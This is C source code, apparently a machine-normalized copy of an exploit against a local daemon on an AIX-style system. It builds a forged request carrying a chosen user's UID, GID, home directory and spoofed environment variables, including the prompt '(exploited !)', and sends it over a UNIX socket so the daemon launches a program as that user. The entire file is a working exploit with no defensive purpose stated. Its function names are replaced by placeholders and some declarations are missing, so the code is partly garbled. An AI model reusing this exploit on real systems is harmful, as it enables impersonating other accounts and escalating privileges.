#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_un {char* sun_path; int /*<<< orphan*/  sun_family; } ;
struct sockaddr {int dummy; } ;
struct passwd {char* pw_dir; char* pw_name; int pw_uid; int pw_gid; } ;
struct hostent {int dummy; } ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int /*<<< orphan*/  AF_UNIX ; 
 char* KOPY ; 
 char* NOUSER ; 
 char* OK ; 
 char* PWD ; 
 int /*<<< orphan*/  SEEK_END ; 
 int /*<<< orphan*/  SEEK_SET ; 
 char* SOCK_PATH ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int TAILLE_BUFFER ; 
 char* UNKNOWN ; 
 int /*<<< orphan*/  FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 scalar_t__ FUNC2 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC5 (char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,int,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC8 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC9 (char*,int,int,int /*<<< orphan*/ *) ; 
 char* FUNC10 (char*) ; 
 struct passwd* FUNC11 (char*) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,...) ; 
 int /*<<< orphan*/  FUNC14 (char*,int /*<<< orphan*/ *) ; 
 int FUNC15 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*,...) ; 
 int /*<<< orphan*/  FUNC17 (char*,char*) ; 
 int /*<<< orphan*/  FUNC18 (char*) ; 
 int /*<<< orphan*/  FUNC19 (int,char*,int) ; 

FUNC20(int argc,char** argv)
{ struct sockaddr_un sin,expediteur;
  struct hostent *hp;
  struct passwd *info;
  int chaussette,taille_expediteur,port,taille_struct,taille_param;
  char buffer[TAILLE_BUFFER],paramz[TAILLE_BUFFER],*disp,*pointeur;
  FILE *param;

  char *HOME,*LOGIN;
  int UID,GID;

  FUNC13("\n\n%s\n\n",KOPY);

  if (argc!=2) { FUNC13("%s\n",NOUSER);
                 FUNC3(1); }


  info=FUNC11(argv[1]);
  if (!info)   { FUNC13("%s\n",UNKNOWN);
                 FUNC3(1); }

  HOME=info->pw_dir;
  LOGIN=info->pw_name;
  UID=info->pw_uid;
  GID=info->pw_gid;

  param=FUNC5("/tmp/tempo.fun","wb");

  chaussette=FUNC15(AF_UNIX,SOCK_STREAM,0);
  sin.sun_family=AF_UNIX;
  FUNC17(sin.sun_path,SOCK_PATH);
  taille_struct=sizeof(struct sockaddr_un);


  if (FUNC2(chaussette,(struct sockaddr*)&sin,taille_struct)<0)
     { FUNC12("connect");
       FUNC3(1); }


  /* 0 0 PF_UID pf_UID 0 0 */

  FUNC16(buffer,"%c%c%c%c%c%c",0,0,UID>>8,UID-((UID>>8)*256),0,0);
  FUNC9(buffer,1,6,param);

  /* PF_GID pf_GID */
  FUNC16(buffer,"%c%c",GID>>8,GID-((GID>>8)*256));
  FUNC9(buffer,1,2,param);

  /* DISPLAY (259) */

  FUNC0(buffer,TAILLE_BUFFER);
  FUNC17(buffer,FUNC10("DISPLAY"));
  FUNC9(buffer,1,259,param);

  /* LANG (1 C 0 0 0 0 0 0 0) */

  FUNC16(buffer,"%c%c%c%c%c%c%c%c%c",1,67,0,0,0,0,0,0,0);
  FUNC9(buffer,1,9,param);

  /* size_$HOME $HOME 0 0 0 */

  FUNC14(HOME,param);

  /* size_$LOGNAME $LOGNAME 0 0 0 */

  FUNC14(LOGIN,param);

  /* size_$USERNAME $USERNAME 0 0 0 */

  FUNC14(LOGIN,param);

  /* size_$PWD $PWD 0 0 0 */

  FUNC14(PWD,param);

  /* size_DISPLAY DISPLAY 0 0 0 */

  //send_environ(ptsname(0),param);

  /* If we send our pts, info_gr will crash as it has already changed UID *
/

  send_environ("/dev/null",param);

  /* It's probably not useful to copy all these environment vars but it was
     good for debugging :) */

  FUNC16(buffer,"%c%c%c%c",23,0,0,0);
  FUNC9(buffer,1,4,param);

  FUNC16(buffer,"_=./startinfo");
  FUNC14(buffer,param);

  FUNC16(buffer,"TMPDIR=/tmp");
  FUNC14(buffer,param);

  FUNC16(buffer,"LANG=%s",FUNC10("LANG"));
  FUNC14(buffer,param);

  FUNC16(buffer,"LOGIN=%s",LOGIN);
  FUNC14(buffer,param);

  FUNC16(buffer,"NLSPATH=%s",FUNC10("NLSPATH"));
  FUNC14(buffer,param);

  FUNC16(buffer,"PATH=%s",FUNC10("PATH"));
  FUNC14(buffer,param);

  FUNC16(buffer,"%s","EDITOR=emacs");
  FUNC14(buffer,param);

  FUNC16(buffer,"LOGNAME=%s",LOGIN);
  FUNC14(buffer,param);

  FUNC16(buffer,"MAIL=/usr/spool/mail/%s",LOGIN);
  FUNC14(buffer,param);

  FUNC16(buffer,"HOSTNAME=%s",FUNC10("HOSTNAME"));
  FUNC14(buffer,param);

  FUNC16(buffer,"LOCPATH=%s",FUNC10("LOCPATH"));
  FUNC14(buffer,param);

  FUNC16(buffer,"%s","PS1=(exploited !) ");
  FUNC14(buffer,param);

  FUNC16(buffer,"USER=%s",LOGIN);
  FUNC14(buffer,param);

  FUNC16(buffer,"AUTHSTATE=%s",FUNC10("AUTHSTATE"));
  FUNC14(buffer,param);

  FUNC16(buffer,"DISPLAY=%s",FUNC10("DISPLAY"));
  FUNC14(buffer,param);

  FUNC16(buffer,"SHELL=%s",FUNC10("SHELL"));
  FUNC14(buffer,param);

  FUNC16(buffer,"%s","ODMDIR=/etc/objrepos");
  FUNC14(buffer,param);

  FUNC16(buffer,"HOME=%s",HOME);
  FUNC14(buffer,param);

  FUNC16(buffer,"%s","TERM=vt220");
  FUNC14(buffer,param);

  FUNC16(buffer,"%s","MAILMSG=[YOU HAVE NEW MAIL]");
  FUNC14(buffer,param);

  FUNC16(buffer,"PWD=%s",PWD);
  FUNC14(buffer,param);

  FUNC16(buffer,"%s","TZ=NFT-1");
  FUNC14(buffer,param);

  FUNC16(buffer,"%s","A__z=! LOGNAME");
  FUNC14(buffer,param);

  /* Start info_gr with -q parameter or the process will be run locally and
     not from the daemon ... */

  FUNC16(buffer,"%c%c%c%c",1,45,113,0);
  FUNC9(buffer,1,4,param);

  FUNC4(param);

  param=FUNC5("/tmp/tempo.fun","rb");
  FUNC7(param,0,SEEK_END);
  taille_param=FUNC8(param);
  FUNC7(param,0,SEEK_SET);
  FUNC6(paramz,1,taille_param,param);
  FUNC4(param);

  FUNC18("/tmp/tempo.fun");

  /* Thank you Mr daemon :) */

  FUNC19(chaussette,paramz,taille_param);

  FUNC13("\n%s %s\n",OK,FUNC10("HOSTNAME"));

  FUNC1(chaussette);
}